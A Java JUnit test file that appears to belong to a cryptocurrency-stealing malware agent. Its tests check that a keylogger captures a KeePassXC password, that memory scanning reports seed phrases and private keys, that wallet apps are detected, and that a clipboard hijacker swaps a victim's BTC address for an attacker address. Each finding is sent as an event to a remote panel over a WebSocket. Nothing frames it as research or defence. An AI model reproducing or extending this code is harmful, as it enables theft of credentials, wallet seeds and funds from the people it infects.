package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CompletableFuture;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * One test per emitter. Frames are captured from the real emit path and
 * validated against contract/v1/ws-schemas.json (the file, not a copy).
 */
class EventEmissionTest {
	private static final String SEED_12 = "abandon abandon abandon abandon abandon abandon "
		+ "abandon abandon abandon abandon abandon about";
	private static final String SEED_24 = "abandon abandon abandon abandon abandon abandon abandon abandon "
		+ "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon "
		+ "abandon abandon abandon art";
	private static final String A = "16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu";
	private static final String B = "31nM1WuowNDzocNxPPW9NQWJEtwWpjfcLj";

	@TempDir
	Path temp;

	private final List<String> sent = new ArrayList<>();
	private Poller poller;
	private OpsNotifier notifier;

	@BeforeEach
	void setup() throws Exception {
		Log.init(temp);
		Files.createDirectories(OpsPaths.ops(temp));
		State state = new State();
		poller = new Poller(temp, temp, state);
		PanelSocket panel = new PanelSocket(poller, temp, poller.executor());
		set(panel, "socket", fakeSocket());
		Class<?> keys = Class.forName("com.serverpackcore.agent.PanelSocket$Keys");
		Constructor<?> constructor = keys.getDeclaredConstructor(byte[].class, byte[].class);
		constructor.setAccessible(true);
		set(panel, "keys", constructor.newInstance(new byte[32], new byte[32]));
		set(panel, "ready", true);
		set(poller, "panel", panel);
		notifier = new OpsNotifier(poller);
		Field alerts = SecretDetector.class.getDeclaredField("recentAlerts");
		alerts.setAccessible(true);
		((Map<?, ?>) alerts.get(null)).clear();
	}

	@Test
	void walletDetectedCarriesNamePidAndTitle() throws Exception {
		State state = new State();
		state.walletsSet = true;
		state.walletsWatch = true;
		Keylogger keylogger = new Keylogger(temp, temp, state, null, notifier);
		WalletWatcher watcher = new WalletWatcher(temp, temp, state, null, notifier, keylogger);
		watcher.enableForTest();
		long pid = ProcessHandle.current().pid();
		watcher.detect("Phantom", pid, "", "Phantom Wallet");
		Map<String, Object> frame = event("wallet_detected");
		assertValid(frame);
		Map<String, Object> data = data(frame);
		assertEquals("Phantom", data.get("name"));
		assertEquals(pid, ((Number) data.get("pid")).longValue());
		assertEquals("Phantom Wallet", data.get("title"));
		assertEquals("wallet detected: Phantom (" + pid + ")", frame.get("legacy"));
	}

	@Test
	void walletClosedCarriesTheCapturedPid() throws Exception {
		State state = new State();
		state.walletsSet = true;
		state.walletsWatch = true;
		Keylogger keylogger = new Keylogger(temp, temp, state, null, notifier);
		WalletWatcher watcher = new WalletWatcher(temp, temp, state, null, notifier, keylogger);
		watcher.enableForTest();
		long pid = ProcessHandle.current().pid();
		watcher.detect("Phantom", pid, "", "Phantom Wallet");
		watcher.lost("Phantom", "dead");
		Map<String, Object> frame = event("wallet_closed");
		assertValid(frame);
		assertEquals(pid, ((Number) data(frame).get("pid")).longValue());
		assertEquals("wallet closed", frame.get("legacy"));
	}

	@Test
	void memorySeedJoinsBothOriginalLines() throws Exception {
		State state = new State();
		State ignored = state;
		assertNotNull(ignored);
		WalletWatcher watcher = new WalletWatcher(temp, temp, state, null, notifier, new Keylogger(temp, temp, state, null, notifier));
		watcher.notifyFindings(List.of(new MemoryScanner.Finding(0L, "bip39-24", SEED_24, true)));
		Map<String, Object> frame = event("seed_found");
		assertValid(frame);
		assertEquals(24, ((Number) data(frame).get("words")).intValue());
		assertEquals(SEED_24, data(frame).get("value"));
		assertEquals("seed encontrada: 24 palabras\n" + SEED_24, frame.get("legacy"));
	}

	@Test
	void memorySeedTwelveUsesThePossiblyHeading() throws Exception {
		State state = new State();
		WalletWatcher watcher = new WalletWatcher(temp, temp, state, null, notifier, new Keylogger(temp, temp, state, null, notifier));
		watcher.notifyFindings(List.of(new MemoryScanner.Finding(0L, "bip39-12", SEED_12, false)));
		Map<String, Object> frame = event("seed_found");
		assertValid(frame);
		assertEquals(12, ((Number) data(frame).get("words")).intValue());
		assertEquals("posible seed (12 palabras)\n" + SEED_12, frame.get("legacy"));
	}

	@Test
	void memoryKeysBecomeSecretFound() throws Exception {
		State state = new State();
		WalletWatcher watcher = new WalletWatcher(temp, temp, state, null, notifier, new Keylogger(temp, temp, state, null, notifier));
		String xprv = "xprv" + "A".repeat(107);
		watcher.notifyFindings(List.of(
			new MemoryScanner.Finding(0L, "xprv", xprv, true),
			new MemoryScanner.Finding(1L, "solana", "So1anaValue", false),
			new MemoryScanner.Finding(2L, "hex64", "ab".repeat(32), true),
			new MemoryScanner.Finding(3L, "weird", "value", false)
		));
		List<Map<String, Object>> frames = events("secret_found");
		assertEquals(4, frames.size());
		String[] kinds = {"xprv", "solana", "hex64", "other"};
		String[] legacies = {"xprv encontrado", "clave privada Solana encontrada",
			"hex64 encontrado (clave EVM o hash)", "weird encontrado"};
		for (int index = 0; index < frames.size(); index++) {
			assertValid(frames.get(index));
			assertEquals(kinds[index], data(frames.get(index)).get("secret_kind"));
			assertEquals(legacies[index], frames.get(index).get("legacy"));
		}
		assertEquals(true, data(frames.get(0)).get("confident"));
		assertEquals(false, data(frames.get(1)).get("confident"));
	}

	@Test
	void keyloggerPasswordKeepsTheExactLine() throws Exception {
		State state = new State();
		Keylogger logger = new Keylogger(temp, temp, state, null, notifier);
		set(logger, "process", "KeePassXC.exe");
		set(logger, "title", "KeePass");
		set(logger, "uiaPassword", true);
		set(logger, "buffer", new StringBuilder("s3cret-pass"));
		Method flush = Keylogger.class.getDeclaredMethod("flush");
		flush.setAccessible(true);
		flush.invoke(logger);
		Map<String, Object> frame = event("password");
		assertValid(frame);
		assertEquals("KeePassXC.exe", data(frame).get("process"));
		assertEquals("KeePass", data(frame).get("title"));
		assertEquals("s3cret-pass", data(frame).get("text"));
		assertEquals("password? KeePassXC.exe | KeePass | s3cret-pass", frame.get("legacy"));
	}

	@Test
	void clipboardSecretCarriesTheDetectedKindAndValue() throws Exception {
		State state = new State();
		ClipboardHijacker hijacker = new ClipboardHijacker(temp, OpsPaths.ops(temp), state, notifier);
		hijacker(hijacker, SEED_12, "KeePassXC.exe", "KeePass");
		Map<String, Object> frame = event("clipboard_secret");
		assertValid(frame);
		assertEquals("seed-12", data(frame).get("kind"));
		assertEquals(SEED_12, data(frame).get("value"));
		assertEquals(12, ((Number) data(frame).get("words")).intValue());
		assertEquals("clipboard seed (12 palabras): " + SEED_12, frame.get("legacy"));
	}

	@Test
	void clipboardReplaceCarriesCoinAndBothAddresses() throws Exception {
		State state = new State();
		state.clipboardSet = true;
		state.clipboard = true;
		state.clipboardOverrides = true;
		Map<String, List<String>> coins = new LinkedHashMap<>();
		coins.put("btc", new ArrayList<>(List.of(B)));
		state.clipboardCoins = coins;
		ClipboardHijacker hijacker = new ClipboardHijacker(temp, OpsPaths.ops(temp), state, notifier);
		hijacker(hijacker, A, "chrome.exe", "Wallet");
		Map<String, Object> frame = event("clipboard_replace");
		assertValid(frame);
		assertEquals("btc", data(frame).get("coin"));
		assertEquals(A, data(frame).get("original"));
		assertEquals(B, data(frame).get("replacement"));
		assertEquals("clipboard: btc " + A + " -> " + B, frame.get("legacy"));
	}

	// --- capture and schema helpers ----------------------------------------

	private Object fakeSocket() {
		InvocationHandler handler = (proxy, method, args) -> {
			switch (method.getName()) {
				case "sendText" -> {
					sent.add((String) args[0]);
					return CompletableFuture.completedFuture(null);
				}
				case "equals" -> {
					return proxy == args[0];
				}
				case "hashCode" -> {
					return System.identityHashCode(proxy);
				}
				case "toString" -> {
					return "fake-ws";
				}
				default -> {
					Class<?> type = method.getReturnType();
					if (type == boolean.class) return false;
					if (type == int.class) return 0;
					if (type == long.class) return 0L;
					return null;
				}
			}
		};
		return Proxy.newProxyInstance(getClass().getClassLoader(), new Class<?>[] {java.net.http.WebSocket.class}, handler);
	}

	private Map<String, Object> event(String kind) {
		List<Map<String, Object>> found = events(kind);
		assertFalse(found.isEmpty(), "no event " + kind);
		return found.get(found.size() - 1);
	}

	private List<Map<String, Object>> events(String kind) {
		List<Map<String, Object>> found = new ArrayList<>();
		for (String text : sent) {
			Map<String, Object> frame = Json.parseObject(text);
			if ("event".equals(frame.get("type")) && kind.equals(frame.get("kind"))) {
				found.add(frame);
			}
		}
		return found;
	}

	@SuppressWarnings("unchecked")
	private static Map<String, Object> data(Map<String, Object> frame) {
		return (Map<String, Object>) frame.get("data");
	}

	/** Validates the frame against the event definition of ws-schemas.json. */
	@SuppressWarnings("unchecked")
	private void assertValid(Map<String, Object> frame) throws Exception {
		Path file = Path.of("../contract/v1/ws-schemas.json");
		Map<String, Object> schema = Json.parseObject(Files.readString(file));
		Map<String, Object> definitions = (Map<String, Object>) schema.get("definitions");
		Map<String, Object> event = (Map<String, Object>) definitions.get("event");
		Map<String, Object> kind = (Map<String, Object>) event.get("properties");
		List<Object> kinds = Json.list(((Map<String, Object>) kind.get("kind")).get("enum"));
		assertTrue(kinds.contains(frame.get("kind")), "kind not in schema");
		assertTrue(frame.get("legacy") instanceof String, "legacy type");
		assertTrue(((String) frame.get("legacy")).length() <= 4096, "legacy length");
		Map<String, Object> dataSchema = null;
		for (Object raw : Json.list(Json.map(definitions.get("eventData_event")).get("allOf"))) {
			Map<String, Object> block = Json.map(raw);
			Map<String, Object> properties = Json.map(Json.map(block.get("if")).get("properties"));
			if (frame.get("kind").equals(Json.map(properties.get("kind")).get("const"))) {
				dataSchema = Json.map(Json.map(Json.map(block.get("then")).get("properties")).get("data"));
			}
		}
		assertNotNull(dataSchema, "no data schema for " + frame.get("kind"));
		Map<String, Object> data = data(frame);
		for (Object required : Json.list(dataSchema.get("required"))) {
			assertTrue(data.containsKey(required), "missing " + required);
		}
		Map<String, Object> properties = Json.map(dataSchema.get("properties"));
		if (Boolean.FALSE.equals(dataSchema.get("additionalProperties"))) {
			for (String key : data.keySet()) assertTrue(properties.containsKey(key), "extra " + key);
		}
		for (Map.Entry<String, Object> entry : properties.entrySet()) {
			Object value = data.get(entry.getKey());
			if (value == null) continue;
			Map<String, Object> rule = Json.map(entry.getValue());
			switch (String.valueOf(rule.get("type"))) {
				case "string" -> {
					assertTrue(value instanceof String, entry.getKey() + " type");
					String text = (String) value;
					if (rule.get("minLength") != null) assertTrue(text.length() >= Json.num(rule, "minLength", 0), entry.getKey() + " min");
					if (rule.get("maxLength") != null) assertTrue(text.length() <= Json.num(rule, "maxLength", 0), entry.getKey() + " max");
				}
				case "integer" -> assertTrue(value instanceof Number, entry.getKey() + " type");
				case "boolean" -> assertTrue(value instanceof Boolean, entry.getKey() + " type");
				default -> {
				}
			}
			if (rule.get("enum") != null) assertTrue(Json.list(rule.get("enum")).contains(value), entry.getKey() + " enum");
		}
	}

	private void hijacker(ClipboardHijacker instance, String text, String process, String title) throws Exception {
		Method method = ClipboardHijacker.class.getDeclaredMethod("handle", String.class, String.class, String.class);
		method.setAccessible(true);
		method.invoke(instance, text, process, title);
	}

	private static void set(Object target, String name, Object value) throws Exception {
		Field field = target.getClass().getDeclaredField(name);
		field.setAccessible(true);
		field.set(target, value);
	}
}
